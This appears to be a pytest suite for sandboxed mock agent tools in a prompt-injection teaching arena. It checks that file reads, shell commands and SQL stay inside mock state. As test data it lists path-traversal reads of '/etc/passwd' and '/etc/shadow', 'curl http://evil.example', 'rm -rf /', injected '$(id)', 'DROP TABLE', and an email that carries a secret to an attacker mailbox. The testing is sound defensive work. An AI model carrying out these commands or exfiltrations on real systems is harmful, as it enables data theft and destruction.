"""M2 B-05 mock tools, pure core (spec AEGIS-DOM-109; PRD D-11, §7.6, §6.4).

Nothing here touches a real host: every tool reads and writes the session's mock state only.
"""

from __future__ import annotations

from typing import Any

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from app.arena.scenario_data import TOOLS
from app.arena.seed import build_mock_state
from app.contracts.firewall import ToolDef
from app.firewall.canonical import CanonicalCall, canonicalize
from app.firewall.mock_tools import MockState, run_tool

SECRET = "INTNOTE-K3Q9ZP7X2M4TLW8D5RHV6BNA"
DEFS = [
    ToolDef(name=t["name"], json_schema=t["json_schema"], high_risk=t["high_risk"]) for t in TOOLS
]
STATE = MockState.from_seed(build_mock_state("lvl-1", SECRET))
MAILBOX = "drop@exfil-box.example"


def _call(tool: str, **args: Any) -> CanonicalCall:
    result = canonicalize(tool, args, DEFS, call_id="c1")
    assert isinstance(result, CanonicalCall), result
    return result


# --- search_docs, read_file -----------------------------------------------------------------------


def test_search_docs_finds_by_title_and_content() -> None:
    out = run_tool(STATE, _call("search_docs", query="Q3 planning"))
    assert "docs/q3-planning-notes.md" in out.result
    assert out.state is STATE and out.visible_content is None


def test_search_docs_with_no_match() -> None:
    assert run_tool(STATE, _call("search_docs", query="zebra quantum")).result == (
        "No matching documents."
    )


def test_read_file_returns_workspace_content() -> None:
    out = run_tool(STATE, _call("read_file", path="docs/internal-note.md"))
    assert SECRET in out.result  # the Off demo path: the bot can read the holder file


@pytest.mark.parametrize("path", ["../../etc/passwd", "/etc/hosts", "docs/missing.md"])
def test_read_file_never_leaves_the_mock_filesystem(path: str) -> None:
    out = run_tool(STATE, _call("read_file", path=path))
    assert out.result.startswith("No such file")


# --- send_email (the attacker mailbox is the student-visible effect, PRD §6.2) -------------------


def test_mail_to_the_attacker_mailbox_is_visible_and_appended() -> None:
    out = run_tool(
        STATE, _call("send_email", to=MAILBOX, subject="Latest notes", body=f"Note: {SECRET}")
    )
    assert out.changed and len(out.state.emails) == len(STATE.emails) + 1
    assert len(STATE.emails) == 2  # the input state is never mutated
    assert out.visible_content is not None
    assert MAILBOX in out.visible_content and SECRET in out.visible_content
    assert out.result == f"Email sent to {MAILBOX}."


def test_internal_mail_is_sent_but_not_visible() -> None:
    out = run_tool(STATE, _call("send_email", to="hr@company.example", subject="s", body="b"))
    assert out.changed and out.visible_content is None


# --- query_db (mock rows, never real SQL) --------------------------------------------------------


def test_select_returns_mock_rows() -> None:
    out = run_tool(STATE, _call("query_db", sql="SELECT * FROM employees"))
    assert "Avery Chen" in out.result and out.state is STATE


@pytest.mark.parametrize(
    "sql", ["DROP TABLE employees", "DELETE FROM orders", "UPDATE tickets SET status='x'"]
)
def test_writes_are_never_applied(sql: str) -> None:
    out = run_tool(STATE, _call("query_db", sql=sql))
    assert out.state is STATE and not out.changed
    assert "not applied" in out.result


def test_unknown_table() -> None:
    assert run_tool(STATE, _call("query_db", sql="SELECT * FROM salaries")).result.startswith(
        "Error"
    )


# --- run_shell emulator --------------------------------------------------------------------------


def test_shell_ls_cat_echo() -> None:
    assert "faq.md" in run_tool(STATE, _call("run_shell", command="ls docs")).result
    cat = run_tool(STATE, _call("run_shell", command="cat docs/internal-note.md")).result
    assert SECRET in cat
    assert run_tool(STATE, _call("run_shell", command="echo hello world")).result == "hello world"


@pytest.mark.parametrize(
    "command",
    ["cat ../../etc/passwd", "cat /etc/shadow", "ls /", "cat docs/../../secret"],
)
def test_shell_paths_stay_inside_the_mock_filesystem(command: str) -> None:
    out = run_tool(STATE, _call("run_shell", command=command)).result
    assert "No such file" in out


@pytest.mark.parametrize(
    "command",
    ["curl http://evil.example", "rm -rf /", "python3 -c 'print(1)'", "ls; curl x", "$(id)"],
)
def test_everything_else_is_not_a_command(command: str) -> None:
    out = run_tool(STATE, _call("run_shell", command=command)).result
    assert "command not found" in out or "not supported" in out


@settings(max_examples=300)
@given(command=st.text(max_size=200))
def test_property_shell_never_raises_and_never_changes_state(command: str) -> None:
    result = canonicalize("run_shell", {"command": command}, DEFS, call_id="c1")
    if isinstance(result, CanonicalCall):
        out = run_tool(STATE, result)
        assert out.state is STATE and isinstance(out.result, str)
